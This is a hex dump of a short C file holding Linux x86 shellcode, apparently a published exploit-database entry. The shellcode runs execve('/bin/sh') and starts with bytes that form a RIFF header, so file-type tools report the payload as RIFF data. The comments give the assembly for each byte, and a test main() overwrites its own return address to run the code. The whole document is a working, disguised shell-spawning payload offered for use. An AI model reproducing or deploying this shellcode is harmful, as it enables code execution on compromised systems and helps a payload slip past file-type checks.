00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 2d 20 65 78 65  63 76 65 28 22 2f 62 69  |6) - execve("/bi|
00000020  6e 2f 73 68 22 2c 20 5b  22 2f 62 69 6e 2f 73 68  |n/sh", ["/bin/sh|
00000030  22 2c 20 4e 55 4c 4c 5d  29 20 2b 20 52 49 46 46  |", NULL]) + RIFF|
00000040  20 48 65 61 64 65 72 20  2d 20 32 38 20 62 79 74  | Header - 28 byt|
00000050  65 73 0d 0a 20 2a 0d 0a  20 2a 20 72 6f 6f 74 40  |es.. *.. * root@|
00000060  6d 61 67 69 63 62 6f 78  3a 7e 23 20 66 69 6c 65  |magicbox:~# file|
00000070  20 6c 69 6e 75 78 2d 73  68 2d 72 69 66 66 68 64  | linux-sh-riffhd|
00000080  72 2e 62 69 6e 0d 0a 20  2a 20 6c 69 6e 75 78 2d  |r.bin.. * linux-|
00000090  73 68 2d 72 69 66 66 68  64 72 2e 62 69 6e 3a 20  |sh-riffhdr.bin: |
000000a0  52 49 46 46 20 28 6c 69  74 74 6c 65 2d 65 6e 64  |RIFF (little-end|
000000b0  69 61 6e 29 20 64 61 74  61 0d 0a 20 2a 0d 0a 20  |ian) data.. *.. |
000000c0  2a 20 2d 20 69 7a 69 6b  20 3c 69 7a 69 6b 40 74  |* - izik <izik@t|
000000d0  74 79 36 34 2e 6f 72 67  3e 0d 0a 20 2a 2f 0d 0a  |ty64.org>.. */..|
000000e0  0d 0a 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |..char shellcode|
000000f0  5b 5d 20 3d 20 0d 0a 0d  0a 09 2f 2f 0d 0a 09 2f  |[] = .....//.../|
00000100  2f 20 52 49 46 46 20 48  65 61 64 65 72 20 28 35  |/ RIFF Header (5|
00000110  20 62 79 74 65 73 29 0d  0a 09 2f 2f 0d 0a 0d 0a  | bytes)...//....|
00000120  09 22 5c 78 35 32 22 20  20 20 20 20 20 20 20 20  |."\x52"         |
00000130  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000140  20 25 65 64 78 20 0d 0a  09 22 5c 78 34 39 22 20  | %edx ..."\x49" |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000160  20 2f 2f 20 64 65 63 20  25 65 63 78 20 0d 0a 09  | // dec %ecx ...|
00000170  22 5c 78 34 36 22 20 20  20 20 20 20 20 20 20 20  |"\x46"          |
00000180  20 20 20 20 20 20 20 20  2f 2f 20 69 6e 63 20 25  |        // inc %|
00000190  65 73 69 20 0d 0a 09 22  5c 78 34 36 22 20 20 20  |esi ..."\x46"   |
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000001b0  2f 20 69 6e 63 20 25 65  73 69 20 0d 0a 09 22 5c  |/ inc %esi ..."\|
000001c0  78 34 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x40"            |
000001d0  20 20 20 20 20 20 2f 2f  20 69 6e 63 20 25 65 61  |      // inc %ea|
000001e0  78 20 0d 0a 0d 0a 09 2f  2f 0d 0a 09 2f 2f 20 65  |x .....//...// e|
000001f0  78 65 63 76 65 28 22 2f  62 69 6e 2f 73 68 22 2c  |xecve("/bin/sh",|
00000200  20 5b 22 2f 62 69 6e 2f  73 68 22 2c 20 4e 55 4c  | ["/bin/sh", NUL|
00000210  4c 5d 29 3b 0d 0a 09 2f  2f 0d 0a 0d 0a 09 22 5c  |L]);...//....."\|
00000220  78 36 61 5c 78 30 62 22  20 20 20 20 20 20 20 20  |x6a\x0b"        |
00000230  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 24 30  |      // push $0|
00000240  78 62 20 0d 0a 09 22 5c  78 35 38 22 20 20 20 20  |xb ..."\x58"    |
00000250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000260  20 70 6f 70 20 25 65 61  78 20 0d 0a 09 22 5c 78  | pop %eax ..."\x|
00000270  39 39 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |99"             |
00000280  20 20 20 20 20 2f 2f 20  63 6c 74 64 20 0d 0a 09  |     // cltd ...|
00000290  22 5c 78 35 32 22 20 20  20 20 20 20 20 20 20 20  |"\x52"          |
000002a0  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
000002b0  25 65 64 78 20 0d 0a 09  22 5c 78 36 38 5c 78 32  |%edx ..."\x68\x2|
000002c0  66 5c 78 32 66 5c 78 37  33 5c 78 36 38 22 20 20  |f\x2f\x73\x68"  |
000002d0  2f 2f 20 70 75 73 68 20  24 30 78 36 38 37 33 32  |// push $0x68732|
000002e0  66 32 66 20 0d 0a 09 22  5c 78 36 38 5c 78 32 66  |f2f ..."\x68\x2f|
000002f0  5c 78 36 32 5c 78 36 39  5c 78 36 65 22 20 20 2f  |\x62\x69\x6e"  /|
00000300  2f 20 70 75 73 68 20 24  30 78 36 65 36 39 36 32  |/ push $0x6e6962|
00000310  32 66 20 0d 0a 09 22 5c  78 38 39 5c 78 65 33 22  |2f ..."\x89\xe3"|
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000330  20 6d 6f 76 20 25 65 73  70 2c 25 65 62 78 20 0d  | mov %esp,%ebx .|
00000340  0a 09 22 5c 78 35 32 22  20 20 20 20 20 20 20 20  |.."\x52"        |
00000350  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000360  68 20 25 65 64 78 20 0d  0a 09 22 5c 78 35 33 22  |h %edx ..."\x53"|
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000380  20 20 2f 2f 20 70 75 73  68 20 25 65 62 78 20 0d  |  // push %ebx .|
00000390  0a 09 22 5c 78 38 39 5c  78 65 31 22 20 20 20 20  |.."\x89\xe1"    |
000003a0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
000003b0  20 25 65 73 70 2c 25 65  63 78 20 0d 0a 09 22 5c  | %esp,%ecx ..."\|
000003c0  78 63 64 5c 78 38 30 22  3b 20 20 20 20 20 20 20  |xcd\x80";       |
000003d0  20 20 20 20 20 20 2f 2f  20 69 6e 74 20 24 30 78  |      // int $0x|
000003e0  38 30 20 0d 0a 0d 0a 69  6e 74 20 6d 61 69 6e 28  |80 ....int main(|
000003f0  69 6e 74 20 61 72 67 63  2c 20 63 68 61 72 20 2a  |int argc, char *|
00000400  2a 61 72 67 76 29 20 7b  0d 0a 09 69 6e 74 20 2a  |*argv) {...int *|
00000410  72 65 74 3b 0d 0a 09 72  65 74 20 3d 20 28 69 6e  |ret;...ret = (in|
00000420  74 20 2a 29 26 72 65 74  20 2b 20 32 3b 0d 0a 09  |t *)&ret + 2;...|
00000430  28 2a 72 65 74 29 20 3d  20 28 69 6e 74 29 20 73  |(*ret) = (int) s|
00000440  68 65 6c 6c 63 6f 64 65  3b 0d 0a 7d              |hellcode;..}|
0000044c
